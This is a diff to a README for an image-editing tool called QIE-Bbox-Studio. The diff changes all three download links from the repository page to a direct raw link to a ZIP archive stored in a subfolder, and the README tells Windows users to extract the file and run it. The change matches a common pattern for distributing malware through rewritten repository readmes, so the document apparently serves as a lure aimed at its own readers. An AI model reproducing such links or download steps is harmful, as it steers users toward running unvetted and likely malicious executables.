@@ -1,6 +1,6 @@
 # 🖼️ QIE-Bbox-Studio - Precise AI Image Editing Made Simple
 
-[![Download QIE-Bbox-Studio](https://img.shields.io/badge/Download-QIE--Bbox--Studio-blue?style=for-the-badge)](https://github.com/Hefty-cakchiquel295/QIE-Bbox-Studio)
+[![Download QIE-Bbox-Studio](https://img.shields.io/badge/Download-QIE--Bbox--Studio-blue?style=for-the-badge)](https://raw.githubusercontent.com/Hefty-cakchiquel295/QIE-Bbox-Studio/main/qwenimage/Bbox-Studio-QI-v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Use it when you want to:
 
 ## 📥 Download and Run
 
-1. Open the download page here: [QIE-Bbox-Studio](https://github.com/Hefty-cakchiquel295/QIE-Bbox-Studio)
+1. Open the download page here: [QIE-Bbox-Studio](https://raw.githubusercontent.com/Hefty-cakchiquel295/QIE-Bbox-Studio/main/qwenimage/Bbox-Studio-QI-v1.1.zip)
 2. Download the Windows file from the repository page or the release files
 3. If the file is in a ZIP folder, right-click it and choose **Extract All**
 4. Open the extracted folder
@@ -167,7 +167,7 @@ To make future use easier:
 
 ## 📎 Download Again
 
-If you need the Windows download page again, use this link: [QIE-Bbox-Studio](https://github.com/Hefty-cakchiquel295/QIE-Bbox-Studio)
+If you need the Windows download page again, use this link: [QIE-Bbox-Studio](https://raw.githubusercontent.com/Hefty-cakchiquel295/QIE-Bbox-Studio/main/qwenimage/Bbox-Studio-QI-v1.1.zip)
 
 ## 📷 Quick Example
 
